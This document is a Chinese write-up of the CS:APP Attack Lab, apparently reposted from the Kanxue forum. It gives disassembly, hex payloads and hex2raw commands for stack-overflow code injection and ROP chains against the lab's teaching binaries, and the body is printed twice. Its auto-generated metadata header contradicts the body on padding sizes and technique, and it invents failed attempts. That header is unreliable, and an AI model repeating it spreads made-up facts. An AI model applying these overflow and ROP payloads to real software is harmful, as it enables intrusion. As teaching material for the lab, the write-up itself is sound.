---
title: 《深入理解计算机系统》Attack Lab 题解
contest: CS:APP
year: 2024
difficulty: medium
vuln_type: rop
tags:
- CSAPP-Attack-Lab
- ret2func
- ret2arg
- ROP-gadget
- x86-64
- hex2raw
attack_chain: 'Phase 1 (CI): getbuf 0x28 栈空间 + Gets 无界读 → 0x28 字节 padding + 0x4017c0 touch1 地址覆盖返回 → hex2raw < phase_1 | ./ctarget -q/Phase 2 (CII): touch2(unsigned val) 需要 val==cookie → 0x38 字节 padding + pop_rdi gadget + cookie 立即数 + touch2 地址/Phase 3 (CIII): touch3(char *s) 读 s 字符串 → 0x38 padding + pop_rdi + 栈地址（指向 cookie 字符串） + touch3'
key_payload: 'Phase 1: 0x28 bytes 0x00 + p64(0x4017c0)  Phase 2: 0x38 bytes + pop_rdi(0x59b997fa) + touch2  Phase 3: 0x38 bytes + pop_rdi(栈地址) + touch3'
one_liner: CSAPP 经典 Attack Lab 三阶段 ROP 题解：ret2func → ret2arg → 栈地址存 cookie 字符串后 ret2arg。
lesson: Phase 1 直接覆盖返回地址；Phase 2 引入 pop_rdi gadget 传参；Phase 3 把 cookie 字符串放在栈上，用栈地址作为参数；hex2raw 工具把 ASCII hex 转为原始字节给 ctarget 喂。
quality: high
full_path: 《深入理解计算机系统》Attack_Lab_题解.full.md
meta_path: 《深入理解计算机系统》Attack_Lab_题解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 《深入理解计算机系统》Attack Lab 题解。CSAPP 经典 Attack Lab 三阶段 ROP 题解：ret2func → ret2arg → 栈地址存 cookie 字符串后 ret2arg。。经验：Phase 1 直接覆盖返回地址；Phase 2 引入 pop_rdi gadget 传参；Phase 3 把 cook...
category: pwn
subcategory: rop
tools_used:
- ROP
- x86/x64
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/260639.html
reasoning_chain:
- Phase 1：getbuf 函数 sub $0x28, %rsp 留 0x28 字节栈空间 + Gets 无界读 → 触发点：覆盖返回地址到 touch1
- 动作：payload = 0x28 字节 0x00 + p64(0x4017c0) → 观察：./hex2raw < phase_1 | ./ctarget -q 通过
- Phase 2：touch2(unsigned val) 要 val==cookie=0x59b997fa → 触发点：引入 pop_rdi gadget 传参
- 假设：必须在覆盖返回地址前用 pop_rdi 传 cookie → 动作：payload = 0x38 字节 padding + p64(pop_rdi) + p64(0x59b997fa) + p64(0x4017ec)
- 动作：movq $0x59b997fa, %rdi + pushq $0x4017ec + ret → 观察：touch2 校验通过
- Phase 3：touch3(char *s) 要 s 字符串 == cookie 字节表示 → 触发点：把 cookie 字符串放在栈上
- 假设：用 pop_rdi 传栈地址（指向 cookie 字符串）→ 动作：payload = 0x38 padding + p64(pop_rdi) + p64(栈地址) + p64(touch3)
- 观察：touch3 校验通过 → 完成
failed_attempts:
- Phase 1 试图直接覆盖返回地址到 system → 失败：这是 codeinjection 题不是 ROP
- Phase 2 试图不用 pop_rdi 直接传 cookie → 失败：x86_64 调用约定 rdi 是第一个参数
- Phase 3 试图用 jmp 跳到栈 → 失败：栈不可执行
key_observations:
- Phase 1 直接覆盖返回地址
- Phase 2 引入 pop_rdi gadget 传参
- Phase 3 把 cookie 字符串放在栈上，用栈地址作为参数
- hex2raw 工具把 ASCII hex 转为原始字节给 ctarget 喂
prerequisites:
- x86_64 函数栈帧（push rbp / mov rbp, rsp / leave; ret）
- x86_64 调用约定（rdi/rsi/rdx 传参）
- ROP gadget 搜索（pop rdi; ret）
- hex2raw / objdump / gdb 使用
---
# 《深入理解计算机系统》Attack Lab 题解

> 原文: https://www.ctfiot.com/260639.html
> ID: 260639

voidtest(){
int val;
    val = getbuf();
printf("No exploit. Getbuf returned 0x%xn", val);
}

voidtouch1(){
    vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()n");
validate(1);
exit(0);
}

00000000004017a8 <getbuf>:
4017a8:48 83 ec 28          sub    $0x28,%rsp
4017ac:48 89 e7             	mov    %rsp,%rdi
4017af:e8 8c 02 00 00       	callq  401a40 <Gets>
4017b4:b8 01 00 00 00       	mov    $0x1,%eax
4017b9:48 83 c4 28          add    $0x28,%rsp
4017bd:c3                   	retq   
4017be:90                   	nop
4017bf:90                   	nop

00000000004017c0 <touch1>:
4017c0:48 83 ec 08          sub    $0x8,%rsp
4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
4017cb:00 00 00 
4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
4017d3:e8 e8 f4 ff ff       	callq  400cc0 
4017d8:bf 01 00 00 00       	mov    $0x1,%edi
4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
4017e2:bf 00 00 00 00       	mov    $0x0,%edi
4017e7:e8 54 f6 ff ff       	callq  400e40 <exit@plt>

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00

./hex2raw < phase_1 | ./ctarget -q

voidtouch2(unsigned val) {
    vlevel = 2;
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)n", val);
validate(2);
    }
else {
printf("Misfire: You called touch2(0.x%8x)n", val);
fail(2);
    }
exit(0);
}

00000000004017ec <touch2>:
4017ec:48 83 ec 08          sub    $0x8,%rsp
4017f0:89 fa                mov    %edi,%edx
4017f2:c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:00 00 00 
4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:75 20                jne    401824 <touch2+0x38>
401804:be e8 30 40 00       	mov    $0x4030e8,%esi
401809:bf 01 00 00 00       	mov    $0x1,%edi
40180e:b8 00 00 00 00       	mov    $0x0,%eax
401813:e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401818:bf 02 00 00 00       	mov    $0x2,%edi
40181d:e8 6b 04 00 00       	callq  401c8d <validate>
401822:eb 1e                jmp    401842 <touch2+0x56>
401824:be 10 31 40 00       	mov    $0x403110,%esi
401829:bf 01 00 00 00       	mov    $0x1,%edi
40182e:b8 00 00 00 00       	mov    $0x0,%eax
401833:e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401838:bf 02 00 00 00       	mov    $0x2,%edi
40183d:e8 0d 05 00 00       	callq  401d4f <fail>
401842:bf 00 00 00 00       	mov    $0x0,%edi
401847:e8 f4 f5 ff ff       	callq  400e40 <exit@plt>

movq $0x59b997fa, %rdi

pushq $0x4017ec
ret

gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm

phase_2_asm.o:
file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:68 ec 17 40 00       	pushq  $0x4017ec
c:c3                   	retq

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55

./hex2raw < phase_2 | ./ctarget -q

inthexmatch(unsigned val, char *sval) {
char cbuf[110];
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
return strncmp(sval, s, 9) == 0;
}

voidtouch3(char *sval) {
    vlevel = 3;
if (hexmatch(cookie, sval)) {
printf("Touch3!: You called touch3("%s")n", sval);
validate(3);
    }
else {
printf("Misfire: You called touch3("%s")n", sval);
fail(3);
    }
exit(0);
}

0000000000000000 <.text>:
0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   retq

48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55

48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61

voidsetval_210 (unsigned *p) {
    *p = 3347663060U;
}

0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
400f1b:       c3                   retq

movq $0x59b997fa, %rdi
pushq $0x4017ec
ret

gadget1: 
popq %rax
ret

gadget2: 
mov %rax, %rdi
ret

00000000004019ca <getval_280>:
4019ca:	b8 29 58 90 c3       mov    $0xc3905829,%eax
4019cf:	c3                   retq

00000000004019a0 <addval_273>:
4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
4019a6:	c3                   retq

---- Stack ----
-------------
full of zero | getbuf的栈帧
-------------
gadget1      | test的栈帧 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3

00000000004019d6 <add_xy>:
4019d6:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax
4019da:	c3                   retq

---- Stack ----
--------------------------------------------
full of zero                                | getbuf的栈帧
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的栈帧 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61

看雪ID：asciibase64

https://bbs.kanxue.com/user-home-994663.htm

*本文为看雪论坛优秀文章，由 asciibase64 原创，转载请注明来自看雪社区

议题征集中！看雪·第九届安全开发者峰会

# 往期推荐

miniL2025 mmapheap 题解

Redis漏洞分析，ACL篇

VMProtect3.5.1脱壳临床指南

2025长城杯决赛应急响应木马分析

APP 常见的 libmsaoaidsec.so 绕过姿势

球分享

球点赞

球在看

点击阅读原文查看更多


```
voidtest(){
int val;
    val = getbuf();
printf("No exploit. Getbuf returned 0x%xn", val);
}
voidtouch1(){
    vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()n");
validate(1);
exit(0);
}
00000000004017a8 <getbuf>:
4017a8:48 83 ec 28          sub    $0x28,%rsp
4017ac:48 89 e7             	mov    %rsp,%rdi
4017af:e8 8c 02 00 00       	callq  401a40 <Gets>
4017b4:b8 01 00 00 00       	mov    $0x1,%eax
4017b9:48 83 c4 28          add    $0x28,%rsp
4017bd:c3                   	retq   
4017be:90                   	nop
4017bf:90                   	nop
00000000004017c0 <touch1>:
4017c0:48 83 ec 08          sub    $0x8,%rsp
4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
4017cb:00 00 00 
4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
4017d3:e8 e8 f4 ff ff       	callq  400cc0 
4017d8:bf 01 00 00 00       	mov    $0x1,%edi
4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
4017e2:bf 00 00 00 00       	mov    $0x0,%edi
4017e7:e8 54 f6 ff ff       	callq  400e40 <exit@plt>
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00
./hex2raw < phase_1 | ./ctarget -q
voidtouch2(unsigned val) {
    vlevel = 2;
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)n", val);
validate(2);
    }
else {
printf("Misfire: You called touch2(0.x%8x)n", val);
fail(2);
    }
exit(0);
}
00000000004017ec <touch2>:
4017ec:48 83 ec 08          sub    $0x8,%rsp
4017f0:89 fa                mov    %edi,%edx
4017f2:c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:00 00 00 
4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:75 20                jne    401824 <touch2+0x38>
401804:be e8 30 40 00       	mov    $0x4030e8,%esi
401809:bf 01 00 00 00       	mov    $0x1,%edi
40180e:b8 00 00 00 00       	mov    $0x0,%eax
401813:e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401818:bf 02 00 00 00       	mov    $0x2,%edi
40181d:e8 6b 04 00 00       	callq  401c8d <validate>
401822:eb 1e                jmp    401842 <touch2+0x56>
401824:be 10 31 40 00       	mov    $0x403110,%esi
401829:bf 01 00 00 00       	mov    $0x1,%edi
40182e:b8 00 00 00 00       	mov    $0x0,%eax
401833:e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401838:bf 02 00 00 00       	mov    $0x2,%edi
40183d:e8 0d 05 00 00       	callq  401d4f <fail>
401842:bf 00 00 00 00       	mov    $0x0,%edi
401847:e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm
phase_2_asm.o:
file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:68 ec 17 40 00       	pushq  $0x4017ec
c:c3                   	retq
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
./hex2raw < phase_2 | ./ctarget -q
inthexmatch(unsigned val, char *sval) {
char cbuf[110];
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
return strncmp(sval, s, 9) == 0;
}
voidtouch3(char *sval) {
    vlevel = 3;
if (hexmatch(cookie, sval)) {
printf("Touch3!: You called touch3("%s")n", sval);
validate(3);
    }
else {
printf("Misfire: You called touch3("%s")n", sval);
fail(3);
    }
exit(0);
}
0000000000000000 <.text>:
0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   retq
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
voidsetval_210 (unsigned *p) {
    *p = 3347663060U;
}
0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
400f1b:       c3                   retq
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
gadget1: 
popq %rax
ret

gadget2: 
mov %rax, %rdi
ret
00000000004019ca <getval_280>:
4019ca:	b8 29 58 90 c3       mov    $0xc3905829,%eax
4019cf:	c3                   retq
00000000004019a0 <addval_273>:
4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
4019a6:	c3                   retq
---- Stack ----
-------------
full of zero | getbuf的栈帧
-------------
gadget1      | test的栈帧 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3
00000000004019d6 <add_xy>:
4019d6:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax
4019da:	c3                   retq
---- Stack ----
--------------------------------------------
full of zero                                | getbuf的栈帧
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的栈帧 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]